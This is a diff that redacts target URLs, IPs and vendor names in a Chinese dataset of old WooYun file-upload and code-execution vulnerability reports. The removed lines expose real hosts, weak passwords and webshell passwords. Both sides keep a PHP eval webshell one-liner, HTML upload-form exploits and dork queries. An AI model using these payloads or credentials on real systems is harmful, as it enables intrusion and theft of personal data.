 3. 验证漏洞响应
 
-**详情**: 某政府网应用siteserver，导致注册任意用户，上传脚本文件执行http://www.changtu.gov.cn/index.htm
+**详情**: 某政府网应用siteserver，导致注册任意用户，上传脚本文件执行https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -5550,7 +5550,7 @@
 
 **详情**: 米多小微企业贷款平台struts旧漏洞任意代码执行，数据库面临被拖，管理员信息，用户信息，贷款信息泄露
 
-**POC**: 网址：http://miduo360.com/publicpages/index.action先上一张网站截图，小清新的风格，页面设计的挺不错，截图未打码，工作人员适当打码列目录拿邮件配置拿数据库配置拿管理拿用户测试登录，用户1测试登录，用户2测试管理员说明：本菜鸟用于测试所下载的某些表均已删除，安全测试，谢绝跨省
+**POC**: 网址：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -5570,9 +5570,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://caigou.chinatelecom.com.cn:8010/ESCM/biddoc/publicDetailTest.do?id=1007
+**详情**: https://example.com/[已脱敏]
 
-**POC**: http://caigou.chinatelecom.com.cn:8010/ESCM/biddoc/publicDetailTest.do?id=1007
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -5592,7 +5592,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 看公开漏洞时候看到这个站http://www.ceboss.cn/liyun@xinnet.com---liyun@xinnet.comPS:之前好像报过，没改。看下订单数量，63万左右、包括各种银行的域名信息工商银行试一下侧漏身份证注册信息，公司信息工商银行企业账号信息另外还可以查看短信套餐的账号密码信息用账号密码登陆就可以发短信了哦。还有1000条余量。（冒充银行么）工单信息合同信息同样可以查看域名解析记录另外在企业的资质处，存在任意文件上传~上传成功了苦逼的是我没用找到路径这里点击就是一个下载的请求，并不是不解析jsp还有个查询whois的接口各种大公司都有的只看域名新订单信息。权限挺大，可以各种操作域名信息以及注册人信息
+**详情**: 看公开漏洞时候看到这个站https://example.com/[已脱敏]
 
 **POC**: 权限挺大，可以各种操作域名信息以及注册人信息
 
@@ -5658,7 +5658,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://sleb.learnnow.net.cn看到登录页面上的这个初始密码，我就笑了（111）得到帐号*/111，你无法想象有多少员工是初始密码，这里我就不指出谁了，是一大批人，内部应该自查了
+**详情**: https://example.com/[已脱敏]
 
 **POC**: 换个帐号再换个在添加公告处存在任意文件上传
 
@@ -5682,7 +5682,7 @@
 
 **详情**: 
 
-**POC**: JBOSS漏洞http://202.101.187.114:9091/invoker/EJBInvokerServlethttp://202.101.187.114:9091/invoker/JMXInvokerServlet菜刀数据库<T>XDB</T><X>oracle.jdbc.driver.OracleDriverjdbc:oracle:thin:@ibm:1521jnbdpjnbdp123321jndbnew</X>
+**POC**: JBOSS漏洞http://[IP已脱敏]
 
 **绕过**: 直接利用
 
@@ -5690,8 +5690,8 @@
 ---
 
 ---
-### [wooyun-2011-03198] 腾讯RTX上传任意文件漏洞
-**厂商**: 腾讯 | **年份**: 2011 | **类型**: 远程代码执行
+### [wooyun-2011-03198] 某互联网公司RTX上传任意文件漏洞
+**厂商**: 某互联网公司 | **年份**: 2011 | **类型**: 远程代码执行
 
 **元思考**: 触发信号: 上传功能
 
@@ -5734,8 +5734,8 @@
 ---
 
 ---
-### [wooyun-2012-05922] 百度网盘上传过滤不严格
-**厂商**: 百度 | **年份**: 2012 | **类型**: 文件上传导致任意代码执行
+### [wooyun-2012-05922] 某搜索引擎网盘上传过滤不严格
+**厂商**: 某搜索引擎 | **年份**: 2012 | **类型**: 文件上传导致任意代码执行
 
 **元思考**: 触发信号: 认证接口, 上传功能
 
@@ -5746,7 +5746,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 使用baidu的hi账号登陆，提交bug，上传多个不同类型文件，php，jsp等，后缀未做任何修改，如果攻击者在某个时候发现了其他能够跳过目录，并赋予执行权限的漏洞，就可能对上传服务器的安全形成隐患。http://bs.baidu.com/online-crowdtest/%2F34766_folder.jsphttp://bs.baidu.com/online-crowdtest/%2F34769_2008.php
+**详情**: 使用baidu的hi账号登陆，提交bug，上传多个不同类型文件，php，jsp等，后缀未做任何修改，如果攻击者在某个时候发现了其他能够跳过目录，并赋予执行权限的漏洞，就可能对上传服务器的安全形成隐患。https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -5768,7 +5768,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 沛县廉政网Netcms oday上传漏洞http://www.fangxian.gov.cn/user/login.aspx点注册之后点击发表文章然后在站内信息那块， 给自己发送个站内信，附件里直接传马。
+**详情**: 沛县廉政网Netcms oday上传漏洞https://example.com/[已脱敏] 给自己发送个站内信，附件里直接传马。
 
 **POC**: (见原文)
 
@@ -5790,7 +5790,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.cnu.edu.cn/editortpxx/upload.jsp此处为上传点。任意文件上传未过滤。
+**详情**: https://example.com/[已脱敏]
 
 **POC**: shellroot
 
@@ -5814,7 +5814,7 @@
 
 **详情**: 火夫在线外卖服务网是目前苏州最专业的第三方外卖订购平台。
 
-**POC**: 1，上传地址：http://www.5huofu.com/admin/upfile/upload.html2，shell3，database4，admin
+**POC**: 1，上传地址：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -5834,9 +5834,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 系统地址：http://cw.crcgas.com/在扫描的时候发现一个路径http://cw.crcgas.com/upload.asp打开页面后
+**详情**: 系统地址：https://example.com/[已脱敏]
 
-**POC**: 但我发现不能正常上传，连传图片都失败所以我想，会不会是少了什么东西，比如上传路径的设置Content-Disposition: form-data; name="filepath"/加上后上传到了我设置的根路径下有了路径，所以嘿嘿，我们猥琐一点一句话地址：http://cw.crcgas.com/wooyun.asp密码：1各种财务数据
+**POC**: 但我发现不能正常上传，连传图片都失败所以我想，会不会是少了什么东西，比如上传路径的设置Content-Disposition: form-data; name="filepath"/加上后上传到了我设置的根路径下有了路径，所以嘿嘿，我们猥琐一点一句话地址：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -5856,7 +5856,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 太平洋证券OA系统http://oatest.tpyzq.com/yzmdy.php经检测分析发现，该漏洞是用户将HTTP请求参数提交至Apache服务器，通过mod_cgi模块交给后端的php-cgi处理，但在执行过程中部分字符没有得到处理，比如空格、等号（=）、减号（-）等。利用这些字符，攻击者可以向后端的php-cgi解析程序提交恶意数据，php-cgi会将这段“数据”当做php参数直接执行。
+**详情**: 太平洋证券OA系统https://example.com/[已脱敏]
 
 **POC**: 直接利用awvs上传<?php echo(system("echo ^<?php @eval(^$^_^POST[^'123456^']);?^>>text.php"));?> 一句话木马用菜刀打开
 
@@ -5878,7 +5878,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 地址：http://www.77.com.tw/admin/FCKeditor/editor/fckeditor.htmlwww.77.com.tw\wuyun.txthttp://www.cadeau.com.tw/wuyun.txthttp://www.test.rivon.com.tw/wuyun.txt我就不一个一个地上传了
+**详情**: 地址：https://example.com/[已脱敏]
 
 **POC**: 能跨全盘，你们懂的。
 
@@ -5888,8 +5888,8 @@
 ---
 
 ---
-### [wooyun-2014-077049] 由一个弱口令引发的中国电信集团多个重要后台侧漏存在任意下载还能给全国管理员发短信等威胁(三)
-**厂商**: 中国电信 | **年份**: 2014 | **类型**: 后台弱口令
+### [wooyun-2014-077049] 由一个弱口令引发的某运营商集团多个重要后台侧漏存在任意下载还能给全国管理员发短信等威胁(三)
+**厂商**: 某运营商 | **年份**: 2014 | **类型**: 后台弱口令
 
 **元思考**: 触发信号: 参数注入, 认证接口, 上传功能
 
@@ -5900,7 +5900,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: #中国电信集团公司产品管理平台#登录点：http://42.99.16.16:8080/productmanager/#账户密码：test  1qaz2wsx本来这个本身的账户好像已经没有什么权限了，什么也看不了。突然在左下角又发现了两个。。#中国电信集团业务工单系统，中国电信集团产品开发管理平台两个平台不能同时登录#第一个，中国电信集团业务工单系统，在默认平台里面的点击右下角业务单管理专区（GET提交密码..）跳转到http://218.80.215.200:8080/pms/MainAction.do点击http://218.80.215.200:8080/pms/index.jsp?type=workSheet#其中基础信息维护部分左边可以发现， 查看管理员通讯录，项目组通讯录。其中用户查询（还需要再点击下右边的查询）可以看全部人员信息，姓名，账户，手机，邮箱，职位，权限。有6000
+**详情**: #某运营商集团公司产品管理平台#登录点：http://[IP已脱敏]  1qaz2wsx本来这个本身的账户好像已经没有什么权限了，什么也看不了。突然在左下角又发现了两个。。#某运营商集团业务工单系统，某运营商集团产品开发管理平台两个平台不能同时登录#第一个，某运营商集团业务工单系统，在默认平台里面的点击右下角业务单管理专区（GET提交密码..）跳转到http://[IP已脱敏] 查看管理员通讯录，项目组通讯录。其中用户查询（还需要再点击下右边的查询）可以看全部人员信息，姓名，账户，手机，邮箱，职位，权限。有6000
 
 **POC**: (见原文)
 
@@ -5922,7 +5922,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1）权限控制不严，文件上传直接暴露在公网；http://plus.aili.com/topicLab/index.php?m=user&a=upload&name=2）运维不当，导致nginx解析漏洞；3）然后，然后就直接上菜刀兄了；
+**详情**: 1）权限控制不严，文件上传直接暴露在公网；https://example.com/[已脱敏]
 
 **POC**: 见详细说明
 
@@ -5966,7 +5966,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://web.10050.net/几百万数据 就这样泄露！
+**详情**: https://example.com/[已脱敏] 就这样泄露！
 
 **POC**: (见原文)
 
@@ -5976,8 +5976,8 @@
 ---
 
 ---
-### [wooyun-2014-065438] 中国电信某站任意文件删除
-**厂商**: 中国电信 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误
+### [wooyun-2014-065438] 某运营商某站任意文件删除
+**厂商**: 某运营商 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 认证接口, 上传功能
 
@@ -5988,7 +5988,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 扫荡目录，发现一处上传。任意上传地址（免登陆）：http://hezuo.sh.189.cn/Upload.aspx上传了一个test.txt,页面显示上传成功，但没有返回上传后的路径。经过每个目录的尝试，发现上传后文件在http://hezuo.sh.189.cn/Users/test.txt,经验证，此处上传没有文件类型限制。注册账户adminadmin后登陆，有一处上传，只能上传指定格式。如图上传了test.jpg右边可点击删除。地址为：http://hezuo.sh.189.cn/Users/adminadmin/test.jpg  adminadmin是用户名。先访问刚才的test.txt文件点击删除test.jpg抓包，改包。返回成功删除文件数 1再访问test.txt文件，发现已经没了。
+**详情**: 扫荡目录，发现一处上传。任意上传地址（免登陆）：https://example.com/[已脱敏]  adminadmin是用户名。先访问刚才的test.txt文件点击删除test.jpg抓包，改包。返回成功删除文件数 1再访问test.txt文件，发现已经没了。
 
 **POC**: (见原文)
 
@@ -6010,7 +6010,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 这是你们旗下的管理的网站吧。。。http://www.hdshangbiao.com/首先看底下的技术支持是 中细软网络科技有限公司然后看见这...又是织梦的 果断...然后利用爬虫找到网站后台果断进入审核大大 快审核 之前的洞都没审核
+**详情**: 这是你们旗下的管理的网站吧。。。https://example.com/[已脱敏] 中细软网络科技有限公司然后看见这...又是织梦的 果断...然后利用爬虫找到网站后台果断进入审核大大 快审核 之前的洞都没审核
 
 **POC**: (见原文)
 
@@ -6032,7 +6032,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: TCL集团某站上传漏洞（已成养马场）。上传地址：http://218.106.133.136/FCKeditor//editor/filemanager/connectors/uploadtest.htmlhttp://218.106.133.136/FCKeditor/editor/filemanager/connectors/test.html
+**详情**: TCL集团某站上传漏洞（已成养马场）。上传地址：http://[IP已脱敏]
 
 **POC**: 如上
 
@@ -6054,7 +6054,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 秦皇岛人才网 http://www.qhdrc.com/http://www.qhdrc.com/pmodi.php注册用户上传头像可上传任意文件无限制可以上传网马等所有文件无限制权限均为777 可导致网站 11万用户个人资料信息泄露危及服务器 。
+**详情**: 秦皇岛人才网 https://example.com/[已脱敏] 可导致网站 11万用户个人资料信息泄露危及服务器 。
 
 **POC**: 通过文件上传上传网马访问服务器文件可查看数据库和网站信息自由下载数据库文件获取用户个人信息和密码由于属于友情测试就没继续下去删除木马 请管理员修复 。
 
@@ -6076,9 +6076,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 其他版本我没测试，估计也是一样的问题http://127.0.0.1/controls/fckeditor/editor/filemanager/browser/default/browser.html?Type=../&Connector=connectors/aspx/connector.aspx跳转到网站根目录上传任意文件。
+**详情**: 其他版本我没测试，估计也是一样的问题http://[IP已脱敏]
 
-**POC**: 如果connector.aspx文件被删可用以下exp，copy以下代码另存为html，上传任意文件<form id="frmUpload" enctype="multipart/form-data" action="http://127.0.0.1/controls/fckeditor/editor/filemanagerhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/aspx/upload.aspx?Type=Media" method="post">Upload a new file:<br><input type="file"
+**POC**: 如果connector.aspx文件被删可用以下exp，copy以下代码另存为html，上传任意文件<form id="frmUpload" enctype="multipart/form-data" action="http://[IP已脱敏] method="post">Upload a new file:<br><input type="file"
 
 **绕过**: 直接利用
 
@@ -6098,7 +6098,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: fck路径http://www.smdx.gov.cn/FCKeditor本地构造上传页面看看有没有后门还挺多的，来看看密码是什么一句话地址：http://www.smdx.gov.cn/UploadFiles/file/image.asp;(1).jpg密码：MYTEST（ps：我什么都没传，我是清白的）
+**详情**: fck路径https://example.com/[已脱敏]).jpg密码：MYTEST（ps：我什么都没传，我是清白的）
 
 **POC**: 菜刀--服务器权限大看看数据库--user表里有部分用户弱口令
 
@@ -6120,7 +6120,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 郑州市地震局政府信息公开管理系统使用fckeditor文章编辑器，存在任意文件上传漏洞！访问地址：http://www.zzeq.gov.cn:8080/fckeditor/editor/filemanager/browser/default/browser.html?Type=../../..&Connector=connectors/jsp/connector
+**详情**: 郑州市地震局政府信息公开管理系统使用fckeditor文章编辑器，存在任意文件上传漏洞！访问地址：https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -6142,7 +6142,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 夏普子站（夏普经销商专区后台管理）漏洞在登陆界面http://docsys.sharp.cn:8006/dealer/system/login.jsp用户填写'密码随便，便可进入后台。右键源码http://docsys.sharp.cn:8006/dealer/system/frame/left.html里有新闻管理，上传不限制，任意文件上传。
+**详情**: 夏普子站（夏普经销商专区后台管理）漏洞在登陆界面https://example.com/[已脱敏]'密码随便，便可进入后台。右键源码https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -6164,9 +6164,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 上传：菜刀：http://www.csks.gov.cn/csjsj/webregister/index.aspx数据库中有挂旗帜的考试系统，数据库权限较高，可以获取该考试中心所有报考考生数据库。我报名后有收到骚扰短信跟电话。怀疑已经被黑产利用。
+**详情**: 上传：菜刀：https://example.com/[已脱敏]
 
-**POC**: 上传：菜刀：http://www.csks.gov.cn/csjsj/webregister/index.aspx数据库中有挂旗帜的考试系统，数据库权限较高，可以获取该考试中心所有报考考生数据库。
+**POC**: 上传：菜刀：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -6174,8 +6174,8 @@
 ---
 
 ---
-### [wooyun-2011-02052] 百度分站存在高危BUG
-**厂商**: 百度 | **年份**: 2011 | **类型**: 文件上传导致任意代码执行
+### [wooyun-2011-02052] 某搜索引擎分站存在高危BUG
+**厂商**: 某搜索引擎 | **年份**: 2011 | **类型**: 文件上传导致任意代码执行
 
 **元思考**: 触发信号: 功能测试
 
@@ -6186,9 +6186,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://pmstar.baidu.com/baidu2011/IndexPage.aspx存在高危FCK编辑器漏洞！
+**详情**: https://example.com/[已脱敏]
 
-**POC**: http://pmstar.baidu.com//FCKeditor/editor/filemanager/browser/default/browser.html?Type=&Connector=connectors/aspx/connector.aspx
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -6210,7 +6210,7 @@
 
 **详情**: 
 
-**POC**: http://www.ahwhly.gov.cn/main/model/newsoperation/webEditor/eWebEditor.jsp上传
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -6252,7 +6252,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 今天无意看到wooyun（http://weibo.com/wooyun2）微博中转发了36氪的某微博，然后手戝点了一下，看到36氪的主页(http://www.36kr.com/)，WordPress程序，没搞头呀（手上有oady的可以wooyun一下），于是试试渗透吧。于是看到投资人服务那里有个分站链接：http://vc.36tr.com/ 注册个创业者身份看看有些什么内容吧。创业者可以上传头像，创建产品什么的。习惯性动作，上传头像抓包改包上传。但经过数次测试，发现上传非图片文件，名称后辍自动加上“_”，即上传 .php 去变成了 ._php 这样的文件不被解释呀。。。但这个过程中也会暴出图片处理的错误信息如下：#0 [2 : getimagesize(/var/www/36tree_v2.0/mars/host/http://vc.36tr.com:80/avatar_image/
+**详情**: 今天无意看到wooyun（https://example.com/[已脱敏])，WordPress程序，没搞头呀（手上有oady的可以wooyun一下），于是试试渗透吧。于是看到投资人服务那里有个分站链接：https://example.com/[已脱敏] 注册个创业者身份看看有些什么内容吧。创业者可以上传头像，创建产品什么的。习惯性动作，上传头像抓包改包上传。但经过数次测试，发现上传非图片文件，名称后辍自动加上“_”，即上传 .php 去变成了 ._php 这样的文件不被解释呀。。。但这个过程中也会暴出图片处理的错误信息如下：#0 [2 : getimagesize(/var/www/36tree_v2.0/mars/host/https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -6274,7 +6274,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 编辑器上传地址http://sb.zjinfo.gov.cn/editor/filemanager/browser/default/browser.html?Connector=connectors/jsp/connector通过burp改包可上传jsp导致整站沦陷
+**详情**: 编辑器上传地址https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -6296,7 +6296,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: fck上传地址：http://branch.gdpu.edu.cn/huli/test//admin/FCKeditor/editor/filemanager/connectors/test.html#
+**详情**: fck上传地址：https://example.com/[已脱敏]
 
 **POC**: 恩，不知道这个洞能不能通过啊，上传小马，传个页面
 
@@ -6318,7 +6318,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 作为江苏人，当然要对江苏卫视的网络安全关心下。稿件上传处没有任何过滤，先传了个jpg的后缀文件，得到其路径，然后用工具检测下webserver，发现是iis6。，然后传个asp的一句话，成功上传。但是问题出现了，asp文件只能下载，不能像图片那样可以查看地址。，想了下，一般这种系统都是把一个用户的传的文件放到一个文件夹下，所以果断替换jpg文件的路径。http://paipai.jstv.comhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/common/2071894144/201304/201304142354597740.jpg改为http://paipai.jstv.comhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/common/2071894144/2013
+**详情**: 作为江苏人，当然要对江苏卫视的网络安全关心下。稿件上传处没有任何过滤，先传了个jpg的后缀文件，得到其路径，然后用工具检测下webserver，发现是iis6。，然后传个asp的一句话，成功上传。但是问题出现了，asp文件只能下载，不能像图片那样可以查看地址。，想了下，一般这种系统都是把一个用户的传的文件放到一个文件夹下，所以果断替换jpg文件的路径。https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -6340,7 +6340,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 首先发现后台可以直接访问。。。http://movie.skyworth.com/manager/Default.aspx进入后台之后，看了下后台功能发现了一个首页焦点图的功能然后看到有一个上传图片的地方，再看看服务器iis 版本号，6.0 利用解析漏洞，直接传了一句话。菜刀连接成功。然后发现底下有多个站点目录，经查询发现一个叫http://www.okshe.com/还有应该是其分站
+**详情**: 首先发现后台可以直接访问。。。https://example.com/[已脱敏] 版本号，6.0 利用解析漏洞，直接传了一句话。菜刀连接成功。然后发现底下有多个站点目录，经查询发现一个叫https://example.com/[已脱敏]
 
 **POC**: 网站整体目录结构数据库连接
 
@@ -6362,9 +6362,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: FCKeditor编辑器上传jsp文件，直接导致分站https://zhaopin.wanda.cn沦陷亲，是root权限哦~~·
+**详情**: FCKeditor编辑器上传jsp文件，直接导致分站https://example.com/[已脱敏]
 
-**POC**: https://zhaopin.wanda.cn/FCKeditor/editor/fckeditor.html
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -6408,7 +6408,7 @@
 
 **详情**: 通过图片上传漏洞上传一句话图片马，iis6解析1.php;.gif执行马
 
-**POC**: googel搜索关键字inurl:website/html/?163.htmlwebsite/html/?161.htmlcompany/html/129.htmljavascript:void(0)eweb/html/?181.htmlwebsite/class/产品名称 医院网站简体版网站制作系统 捆绑软件 医院网站简体版http://www.tweb.tw/建立试用网站，利用iis6的解析漏洞1.php;.gif上传图片一句话进入管理后台http://web.tweb.tw/chenjs(注册的用户)/adm/index.phpwebmaster你注册的用户名上传后文件通用地址http:
+**POC**: googel搜索关键字inurl:website/html/?163.htmlwebsite/html/?161.htmlcompany/html/129.htmljavascript:void(0)eweb/html/?181.htmlwebsite/class/产品名称 医院网站简体版网站制作系统 捆绑软件 医院网站简体版https://example.com/[已脱敏])/adm/index.phpwebmaster你注册的用户名上传后文件通用地址http:
 
 **绕过**: 直接利用
 
@@ -6430,7 +6430,7 @@
 
 **详情**: inurl:BasePlate/LoginCenter/
 
-**POC**: http://pyxx.mhedu.sh.cn/GoodoWebEdit/ftb.insertFile.aspxhttp://www.jincai.sh.cn/GoodoWebEdit/ftb.insertFile.aspxhttp://mail.yanji.edu.sh.cn/oa//GoodoWebEdit/ftb.insertFile.aspxhttp://www.ygxx.hpe.cn/GoodoWebEdit/ftb.insertFile.aspxhttp://www.psjm.pudong-edu.sh.cn/GoodoWebEdit/ftb.insertFile.aspxhttp
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -6472,7 +6472,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://passport.v1.cn/edit/userinfo/uploaduserfacestep2.do未对文件名校检  可上传任意文件（虽然对php jsp 之类的不解析 但是可下载 而且可以上传exe···然后你懂得 可上传远控木马 以及病毒文件等）点击浏览  这里我先选个 html 上传（里面就写个弹框）我们点击浏览 然后上传（这里为了方便 我用了Burp 来截获发送以及返回的数据）http://passport.v1.cn/userupload/5025995.html  这里说明下 5025995 是你的用户ID 也就是说 不管你是上传什么类型的文件  这个是不变的  而且不同的类型的文件独立存在 比如 等会上传的 exe 连接就是   http://passport.v1.cn/userupload/5025995.exe 而你再打开 html的连接 也是不一样的 
+**详情**: https://example.com/[已脱敏]  可上传任意文件（虽然对php jsp 之类的不解析 但是可下载 而且可以上传exe···然后你懂得 可上传远控木马 以及病毒文件等）点击浏览  这里我先选个 html 上传（里面就写个弹框）我们点击浏览 然后上传（这里为了方便 我用了Burp 来截获发送以及返回的数据）https://example.com/[已脱敏]  这里说明下 5025995 是你的用户ID 也就是说 不管你是上传什么类型的文件  这个是不变的  而且不同的类型的文件独立存在 比如 等会上传的 exe 连接就是   https://example.com/[已脱敏] 而你再打开 html的连接 也是不一样的 
 
 **POC**: (见原文)
 
@@ -6482,8 +6482,8 @@
 ---
 
 ---
-### [wooyun-2010-0910] 支付宝一处上传过滤缺陷
-**厂商**: 支付宝 | **年份**: 2010 | **类型**: 文件上传导致任意代码执行
+### [wooyun-2010-0910] 某电商平台一处上传过滤缺陷
+**厂商**: 某电商平台 | **年份**: 2010 | **类型**: 文件上传导致任意代码执行
 
 **元思考**: 触发信号: 功能测试
 
@@ -6494,9 +6494,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: <html><body><meta http-equiv="refresh" content="0.0;url=http://login.taotao.com.auctleom-htm.co.cc/memeber/item_0db1-25078006/&cid=&url=832432.html"></body></html>这段代码 伪造成png文件。访问该png，会跳转到 http://login.taotao.com.auctleom-htm.co.cc/memeber/item_0db1-25078006/&cid=&url=832432.html这个比较简单，请看漏洞证明！
+**详情**: <html><body><meta http-equiv="refresh" content="0.0;url=https://example.com/[已脱敏]"></body></html>这段代码 伪造成png文件。访问该png，会跳转到 https://example.com/[已脱敏]
 
-**POC**: http://img.alipay.com/images/credit/2088002/621/657/054/shanghai_credit_report.png打开可以看到 虽然要跳转的站访问不了 但是确实存在跳转。具体的利用 期待高手继续探究。没有找到具体的上传地方，只找到支付宝头像修改 上传后有类似的图片链接！
+**POC**: https://example.com/[已脱敏] 虽然要跳转的站访问不了 但是确实存在跳转。具体的利用 期待高手继续探究。没有找到具体的上传地方，只找到某电商平台头像修改 上传后有类似的图片链接！
 
 **绕过**: 直接利用
 
@@ -6516,7 +6516,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 网址:http://bbr.cashq.ac.cn:8080/<form enctype="multipart/form-data" action="http://bbr.cashq.ac.cn:8080/general/vmeet/wbUpload.php?fileName=1.php+" method="post"><input type="file" name="Filedata" size="50"><br><input type="submit" value="Upload"></form>http://bbr.cashq.ac.cn:8080/general/vmeet/wbUpload/1.php
+**详情**: 网址:https://example.com/[已脱敏] enctype="multipart/form-data" action="https://example.com/[已脱敏]" method="post"><input type="file" name="Filedata" size="50"><br><input type="submit" value="Upload"></form>https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -6538,9 +6538,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: Fckeditor上传，二次上传是不可以了，<=2.6.4那个exp也没成功，看了下现在权限控制做的不错了没的搞了，但是发现以前被人成功上传了PHP文件，这个应该是win空格那个方法传上去的，你们自查下服务器吧。http://en.anta.com/fckeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=http://en.anta.com/fckeditor/editor/filemanager/connectors/php/connector.php上传的文件地址：http://en.anta.com/file/image/fuce.php
+**详情**: Fckeditor上传，二次上传是不可以了，<=2.6.4那个exp也没成功，看了下现在权限控制做的不错了没的搞了，但是发现以前被人成功上传了PHP文件，这个应该是win空格那个方法传上去的，你们自查下服务器吧。https://example.com/[已脱敏]
 
-**POC**: Fckeditor上传，二次上传是不可以了，<=2.6.4那个exp也没成功，看了下现在权限控制做的不错了没的搞了，但是发现以前被人成功上传了PHP文件，这个应该是win空格那个方法传上去的，你们自查下服务器吧。http://en.anta.com/fckeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=http://en.anta.com/fckeditor/editor/filemanager/connectors/php/connector.php上传的文件地址：http://en.an
+**POC**: Fckeditor上传，二次上传是不可以了，<=2.6.4那个exp也没成功，看了下现在权限控制做的不错了没的搞了，但是发现以前被人成功上传了PHP文件，这个应该是win空格那个方法传上去的，你们自查下服务器吧。https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -6560,9 +6560,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.tofer.com.cnhttp://tofer.yili.com/两个域名，不知道是不是指向同一个站。。。后台地址http://tofer.yili.com/admin账号admin 密码123456进后台可上传任意文件弱弱问一句。马上传之后再哪个目录。找半天没找到
+**详情**: https://example.com/[已脱敏] 密码123456进后台可上传任意文件弱弱问一句。马上传之后再哪个目录。找半天没找到
 
-**POC**: http://www.tofer.com.cnhttp://tofer.yili.com/两个域名，不知道是不是指向同一个站。。。后台地址http://tofer.yili.com/admin账号admin 密码123456进后台可上传任意文件弱弱问一句。马上传之后再哪个目录。找半天没找到
+**POC**: https://example.com/[已脱敏] 密码123456进后台可上传任意文件弱弱问一句。马上传之后再哪个目录。找半天没找到
 
 **绕过**: 直接利用
 
@@ -6606,7 +6606,7 @@
 
 **详情**: 搜狐某站存在任意文件上传漏洞   （半成品）
 
-**POC**: 漏洞站点：http://changyan.sohu.com/install/import漏洞出现在安装功能的评论导入那里要求上传必须为zip压缩包格式   在这里我们建立一个压缩包然后建立一个文件夹里面放入我们的php一句话接下来我们上传试试看地址：http://changyan.sohu.com/install/import/log/90e03525-d6d6-4c77-83ce-4d16fd60bbfb不出意外的话  我们的一句话已经被解压出来   但是不知道文件传到哪里去了  着实郁闷如果这样构不成危害的话  不要紧   我们还有一种方法  直接上传PHP文件首先我们先直接上传我们的ph
+**POC**: 漏洞站点：https://example.com/[已脱敏]   在这里我们建立一个压缩包然后建立一个文件夹里面放入我们的php一句话接下来我们上传试试看地址：https://example.com/[已脱敏]  我们的一句话已经被解压出来   但是不知道文件传到哪里去了  着实郁闷如果这样构不成危害的话  不要紧   我们还有一种方法  直接上传PHP文件首先我们先直接上传我们的ph
 
 **绕过**: 直接利用
 
@@ -6628,7 +6628,7 @@
 
 **详情**: 上传附件地方没有好好处理文件后缀问题:判断的是文件头没有判断后缀问题。。。。。。。。
 
-**POC**: http://wenda.anwsion.com/uploads/questions/20121126/e826a3e05a4beb6c24373ba014fe39f8.php pass合并图片一句话木马成功~！！！！！http://wenda.anwsion.com/robots.txt
